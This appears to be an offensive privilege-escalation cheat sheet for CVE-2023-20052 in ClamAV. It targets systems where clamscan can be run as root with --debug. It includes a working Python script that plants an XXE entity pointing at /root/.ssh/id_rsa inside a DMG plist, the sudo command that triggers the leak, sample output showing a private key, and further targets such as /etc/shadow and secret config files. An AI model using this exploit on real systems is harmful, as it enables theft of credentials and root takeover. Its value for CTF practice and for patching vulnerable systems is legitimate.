# sudo clamscan --debug — DMG XXE Root Read (CVE-2023-20052)

## When this applies

`sudo -l` reveals:
```
(root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/<user>/scanfiles/[a-zA-Z0-9.]+$
```
or any variant that lets you run `clamscan` as root and the debug output is visible to you (stdout, log file, or grep-able). The `--debug` flag is critical — without it the XXE-substituted text is silent.

Affected: ClamAV ≤ 1.0.1, ≤ 0.103.8, ≤ 0.105.2 (CVE-2023-20052).

## Exploit overview

ClamAV's DMG parser parses the embedded plist XML using libxml2 with external entity resolution enabled. We craft a DMG that:
1. Defines an external entity pointing at `/root/.ssh/id_rsa` (or any root-readable file).
2. References the entity inside a `<key>` element where ClamAV expects the literal string `blkx`.
3. Because the value isn't `blkx`, ClamAV emits the warning `cli_scandmg: wanted blkx, text value is <ENTITY_CONTENTS>` — leaking the file content into the debug log.

## Build the malicious DMG

If `genisoimage` / the official `dmg` tool aren't installed locally, generate a base DMG on macOS with `hdiutil`, or grab any innocuous DMG sample. Then patch its embedded XML.

```python
# patch_dmg.py — replaces DOCTYPE + one <key>blkx</key>; updates koly trailer
import struct, re

DATA = bytearray(open('test.dmg','rb').read())
trailer_start = len(DATA) - 512
trailer = DATA[trailer_start:]
assert trailer[:4] == b'koly'
xml_off = struct.unpack('>Q', trailer[0xD8:0xE0])[0]
xml_len = struct.unpack('>Q', trailer[0xE0:0xE8])[0]
xml = bytes(DATA[xml_off:xml_off+xml_len])

new_doc = b'<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa">]>'
xml = re.sub(rb'<!DOCTYPE[^>]*>', new_doc, xml, count=1)
xml = xml.replace(b'<key>blkx</key>', b'<key>&xxe;</key>', 1)

new = bytes(DATA[:xml_off]) + xml + bytes(DATA[xml_off+xml_len:trailer_start])
nt = bytearray(trailer)
nt[0xE0:0xE8] = struct.pack('>Q', len(xml))   # update XMLLength
new += bytes(nt)
open('exploit.dmg','wb').write(new)
```

DMG koly-block layout (last 512 bytes):
| Offset | Field | Size |
|--------|-------|------|
| 0x00   | `koly` magic | 4 |
| 0xD8   | XMLOffset (UInt64BE) | 8 |
| 0xE0   | XMLLength (UInt64BE) | 8 |

Updating `XMLLength` is mandatory; ClamAV reads exactly that many bytes.

## Run the scanner

```bash
sudo /usr/local/bin/clamscan --debug /home/<user>/scanfiles/exploit.dmg \
  2>&1 | grep -A50 "wanted blkx, text value"
```

Output:
```
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXkt...
-----END OPENSSH PRIVATE KEY-----
```

## Read what?

Anything `clamscan` (running as root) can read:
- `/root/.ssh/id_rsa` — most direct path to root login.
- `/root/.bash_history`, `/etc/shadow`, `/root/root.txt`.
- Custom configs holding API tokens — `/etc/<svc>/secrets.yaml`.

Binary files leak too, but XML-control characters (`<`, `&`, NUL) will truncate or terminate parsing. Prefer text targets.

## Common pitfalls

- The first attempt often fires the entity into a `<data>` element — base64 decoder rejects it silently (`failed base64 decoding on mish block 1`) and you get nothing useful. Make sure the entity replaces a `<key>blkx</key>`, NOT `<data>...</data>`.
- Keep the patched DMG size aligned: any change to XML length requires updating `XMLLength` in the koly trailer or ClamAV reads garbage.
- Some systems ship clamscan with debug suppressed via `LogVerbose no` in `/etc/clamav/clamd.conf` — but `--debug` on the CLI overrides config.
- The sudoers regex caps the FILENAME pattern; ensure your file matches `[a-zA-Z0-9.]+$` (no slashes/spaces).

## Sister CVEs to remember

| CVE | Component | Effect |
|-----|-----------|--------|
| CVE-2023-20052 | ClamAV DMG | XXE → arbitrary file read in debug output |
| CVE-2023-20032 | ClamAV HFS+ | RCE in HFS+ partition parser (heap overflow) |
| CVE-2024-20290 | ClamAV OLE2 | DoS / null deref |

Always check `clamscan --version` against the disclosure date — boxes pinned to 1.0.0 are still vulnerable.
